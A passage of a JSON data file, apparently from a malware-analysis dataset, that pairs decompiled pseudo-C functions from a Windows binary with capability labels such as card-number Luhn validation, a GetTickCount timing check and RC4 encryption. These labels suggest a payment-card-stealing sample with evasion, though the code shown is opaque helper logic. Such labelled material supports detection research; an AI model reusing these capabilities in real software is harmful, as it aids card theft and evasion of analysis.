            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040d8c0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040d330(param_1);\n    fcn.0040cf10();\n    fcn.0040e930();\n    return;\n}\n",
        "token_count": 77
    },
    "0040d970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040d970(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040d330(param_1);\n    fcn.0040e500();\n    return;\n}\n",
        "token_count": 66
    },
    "0040da30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040da30(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.0040da10(arg_8h, arg_ch);\n    var_4h = (uVar1 & 0xff) == 0;\n    return uVar1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 98
    },
    "0040dae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dae0(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint var_8h;\n    \n    puVar1 = fcn.0040db40(&var_8h, arg_8h);\n    fcn.0040dab0(*puVar1);\n    return;\n}\n",
        "token_count": 74
    },
    "0040db40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db40(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_8h_00 = 8;\n    fcn.00401b10(8);\n    fcn.0040c990();\n    fcn.0040db90(arg_8h, arg_ch, &var_ch);\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 137
    },
    "0040db90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db90(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    puVar1 = fcn.0040c990();\n    uVar2 = puVar1[1];\n    *arg_10h = *puVar1;\n    arg_10h[1] = uVar2;\n    puVar1 = &var_8h;\n    uVar2 = fcn.0040cf70();\n    uVar2 = fcn.00425ac7(uVar2, puVar1);\n    fcn.0040b410(uVar2, var_8h);\n    fcn.0043a2e7(uVar2);\n    return;\n}\n",
        "token_count": 218
    },
    "0040dc20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dc20(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint *puVar2;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar1 = fcn.0040cf70(&var_8h);\n    arg_8h_00 = fcn.004258d3(uVar1);\n    puVar2 = fcn.0040c990();\n    uVar1 = puVar2[1];\n    *arg_10h = *puVar2;\n    arg_10h[1] = uVar1;\n    fcn.0040b410(arg_8h_00, var_8h);\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 226
    },
    "0040dc80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dc80(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_01;\n    uint in_stack_fffffeec;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_b0h;\n    uint var_78h;\n    uint var_40h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4708e0;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    cVar1 = fcn.00404d10(var_10h);\n    if (cVar1 == '\\0') {\n        cVar1 = fcn.0040e9a0();\n        if (cVar1 != '\\0') {\n            fcn.0040fb30(arg_8h);\n            fcn.0040d3d0(&var_40h, 0);\n            fcn.00401b10(0x38);\n            in_stack_fffffeec = fcn.00401440(&var_e8h);\n            fcn.0040d8f0(in_stack_fffffeec);\n            fcn.00401b10(0x38);\n            fcn.0040da70(&var_b0h);\n            while( true ) {\n                cVar1 = fcn.0040da30(&var_78h, &var_b0h);\n                if (cVar1 == '\\0') break;\n                fcn.0040d4d0();\n                uVar2 = fcn.00402930();\n                cVar1 = fcn.0040dae0(uVar2);\n                if (cVar1 != '\\0') {\n                    arg_8h_01 = &var_28h;\n                    fcn.00402930();\n                    fcn.0040cf90(arg_8h_01);\n                    uVar2 = fcn.00401440(&var_28h);\n                    uVar2 = fcn.0040de80(uVar2);\n                    arg_8h_00 = fcn.00401440(&var_28h);\n                    cVar1 = fcn.0040fe10(arg_8h_00, uVar2);\n                    if (cVar1 != '\\0') {\n                        uVar2 = fcn.00401440(&var_28h);\n                        fcn.00402f80(uVar2);\n                    }\n                    fcn.00404f30();\n                }\n                fcn.0040d4f0();\n            }\n            fcn.0040d970();\n            fcn.0040d970();\n            fcn.0040d970();\n            fcn.0040cf10();\n        }\n    }\n    fcn.0040de60();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_fffffeec);\n    return;\n}\n",
        "token_count": 735
    },
    "0040e550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e550(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint arg_ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = fcn.0040eef0(&var_ch);\n    var_8h = *puVar1;\n    arg_ch = fcn.00401440(arg_8h);\n    fcn.0040fe90(var_8h, arg_ch);\n    return;\n}\n",
        "token_count": 113
    },
    "0040e590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040e590(void)\n\n{\n    uint arg_8h;\n    uint *puVar1;\n    uint *puVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack64;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t *var_11h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470998;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack64 = *0x49106c ^ &stack0xfffffffc;\n    *0x10 = &uStack64;\n    *in_FS_OFFSET = &var_ch_2;\n    fcn.00404960();\n    arg_8h = fcn.00401440(&var_11h);\n    fcn.0040fef0(arg_8h);\n    var_4h = 1;\n    puVar1 = fcn.0040eff0(&var_20h);\n    var_1ch = *puVar1;\n    fcn.0040ef20(&var_24h);\n    puVar1 = &var_28h;\n    puVar2 = fcn.0040ef80(puVar1);\n    fcn.0040ff20(&var_2ch, var_1ch, *puVar2, puVar1);\n    *in_FS_OFFSET = var_ch_2;\n    return var_18h;\n}\n",
        "token_count": 383
    },
    "0040e6f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040e6f0(uint param_1)\n\n{\n    uint arg_8h;\n    uint var_4h;\n    \n    arg_8h = fcn.0040e710(param_1);\n    fcn.0040e910(arg_8h);\n    return;\n}\n",
        "token_count": 84
    },
    "0040e710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e710(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return param_1 + 0x20;\n}\n",
        "token_count": 41
    },
    "0040e910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e910(uint arg_8h)\n\n{\n    fcn.00401440(arg_8h);\n    return;\n}\n",
        "token_count": 34
    },
    "0040e970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e970(uint arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    arg_8h_00 = fcn.00410040(arg_ch, arg_ch + arg_10h * 2);\n    fcn.00401440(arg_8h_00);\n    return;\n}\n",
        "token_count": 88
    },
    "0040e9f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e9f0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_14h;\n    uint arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint arg_ch_00;\n    uint arg_18h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4703d0;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar2 = fcn.00404960(uVar1);\n    iVar3 = fcn.00404960();\n    arg_18h = *(iVar3 + 0x10);\n    arg_14h = fcn.00406170();\n    arg_ch_00 = *(iVar2 + 0x10);\n    arg_8h_00 = fcn.00406170();\n    fcn.00410090(arg_8h_00, arg_ch_00, arg_ch, arg_14h, arg_18h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 313
    },
    "0040ea70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ea70(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    iVar3 = fcn.00401440(uVar2);\n    arg_ch = iVar3;\n    uVar2 = fcn.00406170();\n    iVar4 = fcn.00401440(uVar2);\n    fcn.00406140(iVar4 + *(iVar3 + 0x10) * 2, arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 259
    },
    "0040eaf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040eaf0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    uVar2 = fcn.00401440(uVar2);\n    uVar3 = fcn.00406170();\n    uVar3 = fcn.00401440(uVar3);\n    fcn.00406140(uVar3, uVar2);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 228
    },
    "0040eb60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040eb7e)\n\nint32_t __cdecl fcn.0040eb60(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401440(arg_8h);\n    if (in_ECX != iVar1) {\n        uVar2 = fcn.00404960();\n        fcn.00406320(uVar2);\n        iVar1 = fcn.00404960();\n        uVar2 = *(iVar1 + 0x10);\n        arg_8h_00 = fcn.00406170();\n        fcn.004064f0(arg_8h_00, uVar2);\n    }\n    return in_ECX;\n}\n",
        "token_count": 199
    },
    "0040edd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040edd0(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    return *param_1 + 8;\n}\n",
        "token_count": 41
    },
    "0040f100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f100(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint *puVar1;\n    int32_t *in_FS_OFFSET;\n    uint arg_18h;\n    uint var_40h;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470a68;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = fcn.0040fbe0(arg_8h);\n    var_4h = 0;\n    fcn.0040b410(0, 0xffff);\n    arg_18h = 0xffff;\n    puVar1 = fcn.0040b410(arg_ch, 0xffff);\n    fcn.0040d110(arg_8h_00, *puVar1, puVar1[1], arg_ch, arg_18h);\n    var_4h = 0xffffffff;\n    fcn.0040cf10();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 297
    },
    "0040f3e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f3e0(uint arg_8h)\n\n{\n    uint noname_0;\n    uint var_4h;\n    \n    noname_0 = fcn.00404960();\n    fcn.00410130(noname_0, arg_8h);\n    return;\n}\n",
        "token_count": 69
    },
    "0040f450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f450(int32_t arg_8h)\n\n{\n    uint noname_0;\n    uint arg_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    noname_0 = fcn.00404960();\n    arg_ch = fcn.00401440(arg_8h + 8);\n    fcn.004101e0(noname_0, arg_ch);\n    fcn.00410130(noname_0, arg_8h);\n    return;\n}\n",
        "token_count": 115
    },
    "0040f8a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f8a0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00410250(arg_8h);\n    fcn.00408d10(arg_8h_00);\n    return;\n}\n",
        "token_count": 75
    },
    "0040f8d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f8d0(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00408d50(arg_8h, arg_ch * 0x68);\n    return;\n}\n",
        "token_count": 59
    },
    "0040f8f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f8f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00425875(0x496158, fcn.00410670, 0x49615c);\n    if (iVar1 == 0) {\n        fcn.004567ea();\n    }\n    return 0x49615c;\n}\n",
        "token_count": 82
    },
    "0040f920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f920(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00425875(0x496164, fcn.004106a0, 0x496150);\n    if (iVar1 == 0) {\n        fcn.004567ea();\n    }\n    return 0x496150;\n}\n",
        "token_count": 79
    },
    "0040f950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0040f950(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint8_t *puVar1;\n    uint arg_14h_00;\n    uint arg_10h_00;\n    uint arg_ch_00;\n    uint arg_8h_00;\n    uint32_t arg_18h_00;\n    uchar var_3h [2];\n    uint var_1h;\n    \n    puVar1 = fcn.00401440(var_3h);\n    arg_18h_00 = *puVar1;\n    arg_14h_00 = fcn.004106d0(&arg_14h);\n    arg_10h_00 = fcn.004106d0(&arg_10h);\n    arg_ch_00 = fcn.004106d0(&arg_ch);\n    arg_8h_00 = fcn.004106d0(&arg_8h);\n    fcn.004106e0(arg_8h_00, arg_ch_00, arg_10h_00, arg_14h_00, arg_18h_00);\n    return;\n}\n",
        "token_count": 281
    },
    "0040f9c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f9c0(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    ushort *puVar5;\n    int32_t iVar6;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint arg_10h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_31h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470ae8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00402930(var_10h);\n    puVar1 = fcn.0040ea70(&var_3ch);\n    arg_10h = *puVar1;\n    puVar1 = &var_40h;\n    puVar2 = fcn.0040eaf0(puVar1);\n    arg_8h_00 = *puVar2;\n    fcn.00410720(arg_8h_00, puVar1, arg_10h);\n    var_4h = 0;\n    stack0xffffffcc = 0;\n    while( true ) {\n        uVar3 = fcn.00404d90();\n        if (uVar3 <= stack0xffffffcc) break;\n        piVar4 = fcn.00404f00(stack0xffffffcc);\n        if (*piVar4 == 0x2f) {\n            puVar5 = fcn.00404f00(stack0xffffffcc);\n            *puVar5 = 0x5c;\n        }\n        *0x4 = stack0xffffffcc + 1;\n    }\n    iVar6 = fcn.00404d90();\n    if (iVar6 != 0) {\n        iVar6 = fcn.00404d90();\n        if (iVar6 != 0) {\n            piVar4 = fcn.00410560();\n            if (*piVar4 != 0x3a) {\n                piVar4 = fcn.00410560();\n                if (*piVar4 != 0x2f) {\n                    piVar4 = fcn.00410560();\n                    if (*piVar4 != 0x5c) {\n                        piVar4 = fcn.00404f00(0);\n                        if (*piVar4 != 0x2f) {\n                            piVar4 = fcn.00404f00(0);\n                            if (*piVar4 != 0x5c) {\n                                fcn.004065c0(1, 0x5c);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.00409870(&var_28h);\n    var_38h = var_2ch;\n    var_4h = 0xffffffff;\n    fcn.00404f30();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 743
    },
    "0040fb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040fb30(uint arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint var_30h;\n    uchar var_29h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470b20;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = arg_8h_00;\n    fcn.00405100();\n    var_4h = 0;\n    fcn.00405100();\n    var_4h._0_1_ = 1;\n    uVar1 = fcn.00404d90(var_29h);\n    arg_ch = fcn.00404db0();\n    uVar1 = fcn.0040e970(&var_28h, arg_ch, uVar1);\n    fcn.0040cf50(uVar1);\n    var_4h = var_4h._1_3_ << 8;\n    fcn.00404f30();\n    var_4h = 0xffffffff;\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 360
    },
    "0040fbe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040fbe0(uint16_t *arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint var_48h;\n    uchar var_41h;\n    uint var_40h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470b68;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = arg_8h_00;\n    fcn.00405100();\n    var_4h = 0;\n    fcn.00405100();\n    var_4h._0_1_ = 1;\n    for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n        arg_8h_00 = *arg_8h;\n        fcn.00410590(arg_8h_00);\n    }\n    fcn.00405100();\n    var_4h._0_1_ = 2;\n    uVar1 = fcn.00404d90(var_41h);\n    arg_ch = fcn.00404db0();\n    uVar1 = fcn.0040e970(&var_40h, arg_ch, uVar1);\n    fcn.0040cf50(uVar1);\n    var_4h._0_1_ = 1;\n    fcn.00404f30();\n    var_4h = var_4h._1_3_ << 8;\n    fcn.00404f30();\n    var_4h = 0xffffffff;\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 471
    },
    "0040fcd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040fcd0(uint param_1)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470b98;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0040e880(uVar1);\n    var_4h = 0;\n    fcn.0040cea0();\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 168
    },
    "0040fd30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fd30(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470b98;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = fcn.00401440(arg_8h);\n    fcn.00410280(uVar1);\n    var_4h = 0;\n    uVar1 = fcn.00401440(arg_ch);\n    fcn.0040cec0(uVar1);\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 190
    },
    "0040fdd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040fdd0(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.0040fdb0(arg_8h, arg_ch);\n    var_4h = (uVar1 & 0xff) == 0;\n    return uVar1 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 99
    },
    "0040fe10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fe10(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    uint uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = fcn.0040eda0();\n    if (cVar1 != '\\0') {\n        fcn.00425709();\n    }\n    piVar2 = fcn.0040f310();\n    uVar3 = fcn.00401440(&arg_ch);\n    uVar4 = fcn.00401440(arg_8h);\n    (**(*piVar2 + 8))(uVar4, uVar3);\n    return;\n}\n",
        "token_count": 164
    },
    "0040fe90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fe90(int32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(arg_8h + 4);\n    uVar2 = fcn.00401440(arg_ch);\n    uVar2 = fcn.004107b0(arg_8h, puVar1, uVar2);\n    fcn.004103b0(1);\n    *(arg_8h + 4) = uVar2;\n    *puVar1 = uVar2;\n    return;\n}\n",
        "token_count": 157
    },
    "0040fef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fef0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00410880(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "0040ff20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ff20(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint8_t var_eh;\n    uint8_t var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    fcn.00401b10(4);\n    fcn.0040f690(&var_8h, arg_ch);\n    uVar2 = fcn.0040eff0(&var_14h);\n    cVar1 = fcn.00410320(uVar2);\n    if (cVar1 == '\\0') {\n        fcn.00410350();\n        uVar4 = var_eh;\n        uVar5 = arg_10h;\n        uVar6 = arg_14h;\n        puVar3 = fcn.004108d0(&var_1ch, &arg_ch);\n        uVar2 = *puVar3;\n        fcn.004108f0(uVar2, uVar5, uVar6, uVar4);\n        puVar3 = fcn.00410370();\n        *arg_8h = *puVar3;\n    }\n    else {\n        uVar4 = var_dh;\n        uVar5 = arg_10h;\n        uVar6 = arg_14h;\n        puVar3 = fcn.004108d0(&var_18h, &arg_ch);\n        uVar2 = *puVar3;\n        fcn.004108f0(uVar2, uVar5, uVar6, uVar4);\n        fcn.0040eff0(arg_8h);\n    }\n    fcn.0043a2e7(uVar2);\n    return;\n}\n",
        "token_count": 464
    },
    "00410000": {
        "rules": [
